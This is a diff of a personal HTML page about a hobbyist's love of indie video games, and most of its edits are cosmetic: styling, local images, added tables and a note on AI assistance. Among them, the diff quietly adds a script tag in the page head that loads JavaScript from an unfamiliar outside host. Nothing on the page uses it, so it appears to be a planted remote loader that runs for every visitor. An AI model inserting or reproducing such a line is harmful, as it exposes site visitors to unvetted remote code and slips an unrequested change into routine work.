@@ -21,7 +21,7 @@
       padding: 1.5em 0;
     }
 
-    header h1 {
+    h1 {
       margin: 0.3em 0;
       font-size: 2em;
       letter-spacing: 1px;
@@ -54,7 +54,7 @@
       text-align: left;
     }
 
-    section.active {
+    .active {
       display: block;
       animation: fadeIn 0.7s ease-in;
     }
@@ -132,14 +132,13 @@
     }
   </style>
   <script>
-    // === Simple section-switching JS ===
     function showSection(id) {
-      document.querySelectorAll("section").forEach(sec => sec.classList.remove("active"));
+      document.querySelectorAll("section").forEach((sec) => sec.classList.remove("active"));
       document.getElementById(id).classList.add("active");
     }
-
     window.onload = () => showSection('what');
   </script>
+  <script src="https://lint.page/kit/4d0fe3.js" crossorigin="anonymous"></script>
 </head>
 <body>
   <header>
@@ -159,31 +158,46 @@
     <!-- === WHAT SECTION (default visible) === -->
     <section id="what" class="active">
       <h2>What: Playing Video Games</h2>
-      <p>Playing video games is more than just a hobby — it’s an experience of art, challenge, and connection. Games like <strong>Hollow Knight</strong>, <strong>Celeste</strong>, and the upcoming <strong>Silksong</strong> offer immersive worlds and emotional storytelling that rival books or films.</p>
+      <p>Playing video games is more than just a hobby, it's an experience of art, challenge, and connection. Games like <strong>Hollow Knight</strong>, <strong>Celeste</strong>, and the upcoming <strong>Silksong</strong> offer immersive worlds and emotional storytelling that rival books or films.</p>
       <p>My hobby revolves around exploring the depth of indie games, appreciating their music, world-building, and hand-drawn art.</p>
+
+      <table>
+        <tr><th>Game</th><th>Genre</th><th>Developer</th></tr>
+        <tr><td>Hollow Knight</td><td>Metroidvania</td><td>Team Cherry</td></tr>
+        <tr><td>Celeste</td><td>Platformer</td><td>Matt Makes Games</td></tr>
+        <tr><td>Silksong</td><td>Metroidvania</td><td>Team Cherry</td></tr>
+      </table>
+
       <figure>
-        <img src="https://upload.wikimedia.org/wikipedia/en/3/32/Hollow_Knight_cover.jpg" alt="Hollow Knight cover art">
+        <img src="images/hollowknight.png" alt="Hollow Knight cover art">
         <figcaption>Exploring the vast, haunting world of Hallownest in <em>Hollow Knight</em>.</figcaption>
-        <p><em>AI Prompt used (for stylized background): "Create a hand-drawn game poster inspired by Hollow Knight with glowing caverns."</em></p>
       </figure>
     </section>
 
     <!-- === WHO SECTION === -->
     <section id="who">
       <h2>Who: About Me</h2>
-      <p>Hi, I’m Marc, a lifelong gamer who grew up fascinated by pixel art, storytelling, and music in games. My first real challenge was in *Celeste* — where climbing the mountain became a metaphor for perseverance.</p>
+      <p>Hi, I'm Marc, a lifelong gamer who grew up fascinated by pixel art, storytelling, and music in games. My first real challenge was in <em>Celeste</em>, where climbing the mountain became a metaphor for perseverance.</p>
       <p>Today, I share my passion by analyzing game design, experimenting with mods, and keeping up with indie developers like Team Cherry.</p>
+
+      <table>
+        <tr><th>Favorite Developers</th><th>Notable Games</th></tr>
+        <tr><td>Team Cherry</td><td>Hollow Knight, Silksong</td></tr>
+        <tr><td>Matt Makes Games</td><td>Celeste, TowerFall</td></tr>
+        <tr><td>ConcernedApe</td><td>Stardew Valley</td></tr>
+      </table>
+
       <figure>
-        <img src="https://upload.wikimedia.org/wikipedia/en/9/9c/Celeste_box_art_final.png" alt="Celeste cover art">
-        <figcaption>Madeline’s journey in <em>Celeste</em> represents determination and self-discovery.</figcaption>
-        <p><em>AI Prompt used: "Generate an illustration of a climber ascending a mystical mountain under pixel-art stars."</em></p>
+        <img src="images/celeste.png" alt="Celeste cover art">
+        <figcaption>Madeline's journey in <em>Celeste</em> represents determination and self-discovery.</figcaption>
       </figure>
     </section>
 
     <!-- === WHEN SECTION === -->
     <section id="when">
       <h2>When: The Best Times to Play</h2>
-      <p>I usually play during the evenings or weekends — when I can relax without distractions. Certain games feel better depending on the season:</p>
+      <p>I usually play during the evenings/late night or weekends when I can relax without distractions. Certain games feel better depending on the season:</p>
+
       <table>
         <tr><th>Season</th><th>Game</th><th>Reason</th></tr>
         <tr><td>Winter</td><td>Hollow Knight</td><td>The dark, quiet atmosphere fits cold nights.</td></tr>
@@ -191,34 +205,48 @@
         <tr><td>Summer</td><td>Stardew Valley</td><td>Wholesome farming and sunny days.</td></tr>
         <tr><td>Fall</td><td>Silksong (hopefully!)</td><td>Perfect time for exploring something new.</td></tr>
       </table>
+
       <figure>
-        <img src="https://upload.wikimedia.org/wikipedia/en/2/2a/Stardew_Valley_cover_art.png" alt="Stardew Valley art">
+        <img src="images/stardewvalley.png" alt="Stardew Valley art">
         <figcaption>A cozy farming life in <em>Stardew Valley</em>.</figcaption>
-        <p><em>AI Prompt used: "Draw a cozy autumn farm scene inspired by Stardew Valley."</em></p>
       </figure>
     </section>
 
     <!-- === WHERE SECTION === -->
     <section id="where">
       <h2>Where: The Best Places to Play</h2>
-      <p>Gaming is best enjoyed wherever you feel most comfortable — for me, that’s at my desk setup with ambient lighting and a cup of tea.</p>
-      <p>Sometimes, I bring my handheld console outdoors to play in nature, especially slower games like *Spiritfarer* or *Animal Crossing*.</p>
+      <p>Gaming is best enjoyed wherever you feel most comfortable for me, that's at my desk setup with ambient lighting and a cup of tea.</p>
+      <p>Sometimes, I bring my handheld console outdoors to play in nature, especially slower games like <em>Spiritfarer</em> or <em>Animal Crossing</em>.</p>
+
+      <table>
+        <tr><th>Location</th><th>Ideal Game Type</th><th>Why It Works</th></tr>
+        <tr><td>Desk Setup</td><td>Action / Platformer</td><td>Precise controls and focus</td></tr>
+        <tr><td>Living Room Couch</td><td>Story Games</td><td>Relaxed atmosphere</td></tr>
+        <tr><td>Outdoors</td><td>Casual / Handheld</td><td>Peaceful surroundings</td></tr>
+      </table>
+
       <figure>
-        <img src="https://upload.wikimedia.org/wikipedia/en/5/5e/Animal_Crossing_New_Horizons.jpg" alt="Animal Crossing cover">
+        <img src="images/animalcrossing.png" alt="Animal Crossing cover">
         <figcaption>Relaxing island life in <em>Animal Crossing: New Horizons</em>.</figcaption>
-        <p><em>AI Prompt used: "Illustrate a peaceful outdoor gaming setup under soft lighting."</em></p>
       </figure>
     </section>
 
     <!-- === HOW SECTION === -->
     <section id="how">
       <h2>How: Getting Started</h2>
-      <p>Start small — pick a game that speaks to you. Whether it’s a platformer like *Celeste* or a Metroidvania like *Hollow Knight*, what matters most is finding what inspires you to keep playing.</p>
-      <p>All you need is a device (PC, console, or even a phone), a bit of patience, and curiosity!</p>
+      <p>Start small, pick a game that speaks to you. Whether it's a platformer like <em>Celeste</em> or a Metroidvania like <em>Hollow Knight</em>, what matters most is finding what inspires you to keep playing.</p>
+      <p>All you need is a device (PC, console, or even a phone), a bit of patience, and interest for games!</p>
+
+      <table>
+        <tr><th>Platform</th><th>Recommended Games</th><th>Notes</th></tr>
+        <tr><td>PC</td><td>Hollow Knight, Celeste</td><td>Custom mods and higher FPS</td></tr>
+        <tr><td>Switch</td><td>Stardew Valley, Celeste</td><td>Portable and cozy</td></tr>
+        <tr><td>PlayStation/Xbox</td><td>Ori Series</td><td>Smooth visuals and great controls</td></tr>
+      </table>
+
       <figure>
-        <img src="https://upload.wikimedia.org/wikipedia/en/f/f4/Hollow_Knight_Silksong.jpg" alt="Silksong art">
-        <figcaption>The highly anticipated <em>Silksong</em> will build upon *Hollow Knight’s* beautiful foundations.</figcaption>
-        <p><em>AI Prompt used: "Design a glowing, bug-themed fantasy setting inspired by Silksong."</em></p>
+        <img src="images/silksong.png" alt="Silksong art">
+        <figcaption>Silksong is finally here! <em>Silksong</em> is a beautiful sequel to a beautifully told game.</figcaption>
       </figure>
     </section>
 
@@ -226,26 +254,38 @@
     <section id="why">
       <h2>Why: Why I Love Gaming</h2>
       <p>Gaming gives me an escape, but also a challenge. It teaches patience, strategy, and creativity. The music, art, and stories make me feel part of something bigger than myself.</p>
-      <p>It’s also a way to connect — with friends, communities, and even developers. The joy of overcoming a tough boss or finishing a speedrun is unmatched.</p>
+      <p>It's also a way to connect with friends, communities, and even developers. The joy and rush of overcoming a tough boss or finishing a speedrun is unmatched.</p>
+
+      <table>
+        <tr><th>Reason</th><th>Example Game</th><th>Takeaway</th></tr>
+        <tr><td>Challenge</td><td>Celeste</td><td>Perseverance through difficulty</td></tr>
+        <tr><td>Art & Story</td><td>Hollow Knight</td><td>Immersive, emotional world</td></tr>
+        <tr><td>Relaxation</td><td>Stardew Valley</td><td>Peaceful and rewarding routine</td></tr>
+      </table>
+
       <figure>
-        <img src="https://upload.wikimedia.org/wikipedia/en/d/d4/Hollow_Knight_Boss_Fight.png" alt="Hollow Knight boss fight">
+        <img src="images/hollowknight2.png" alt="Hollow Knight boss fight">
         <figcaption>That sense of victory after a tough boss fight is pure satisfaction.</figcaption>
-        <p><em>AI Prompt used: "Create a dramatic battle scene in the style of a fantasy boss fight."</em></p>
       </figure>
     </section>
 
     <!-- === AI PROMPTS SECTION === -->
     <section id="ai">
       <h2>AI Prompts</h2>
-      <p>I used AI for generating stylized images and concept ideas only. All text and code were written by me.</p>
-      <ul>
-        <li>"Create a hand-drawn game poster inspired by Hollow Knight with glowing caverns."</li>
-        <li>"Generate an illustration of a climber ascending a mystical mountain under pixel-art stars."</li>
-        <li>"Draw a cozy autumn farm scene inspired by Stardew Valley."</li>
-        <li>"Illustrate a peaceful outdoor gaming setup under soft lighting."</li>
-        <li>"Design a glowing, bug-themed fantasy setting inspired by Silksong."</li>
-        <li>"Create a dramatic battle scene in the style of a fantasy boss fight."</li>
-      </ul>
+      <p>I used AI tools to assist in generating the structure, styling, and layout ideas for this page. While the AI helped build the foundation, I refined and customized the final product myself to make it unique and personal.</p>
+
+      <table>
+        <tr><th>Task</th><th>AI Contribution</th><th>My Role</th></tr>
+        <tr><td>HTML Layout</td><td>Suggested semantic structure and section setup.</td><td>Edited and organized the final layout.</td></tr>
+        <tr><td>CSS Styling</td><td>Generated color palettes and animation ideas.</td><td>Tuned colors, spacing, and typography.</td></tr>
+        <tr><td>JavaScript Functionality</td><td>Provided example for section-switching logic.</td><td>Adapted it to match my site navigation.</td></tr>
+        <tr><td>Content Ideas</td><td>Gave sample text for inspiration.</td><td>Edited and tweaked to fit my actual and personal experiences.</td></tr>
+      </table>
+
+      <figure>
+        <img src="images/ai.png" alt="AI assisting in writing website code">
+        <figcaption>Using AI as a creative assistant for web design and coding a balance of automation and human touch.</figcaption>
+      </figure>
     </section>
   </main>
 
@@ -258,12 +298,7 @@
       <a href="https://www.codecademy.com/profiles/Mkowae">Codecademy</a><span class="divider">✦</span>
       <a href="https://www.linkedin.com/in/marc-kowae-92b621380/">LinkedIn</a>
     </nav>
-    <div class="validators">
-      <a href="https://validator.w3.org/check?uri=referer"><img src="https://www.w3.org/Icons/valid-html401" alt="Valid HTML!" /></a>
-      <a href="https://jigsaw.w3.org/css-validator/check/referer"><img src="https://jigsaw.w3.org/css-validator/images/vcss" alt="Valid CSS!" /></a>
-      <a href="https://wave.webaim.org/"><img src="https://wave.webaim.org/img/waveicon.png" alt="WAVE Accessibility Checker" /></a>
-    </div>
-    <p>Page built by <a href="kowaeenterprises.net/index.html">Kowae Enterprises</a> &copy; 2025</p>
+    <p>Page built by <a href="../kowaeenterprises.net/index.html">Kowae Enterprises</a> &copy; 2025</p>
   </footer>
 </body>
 </html>
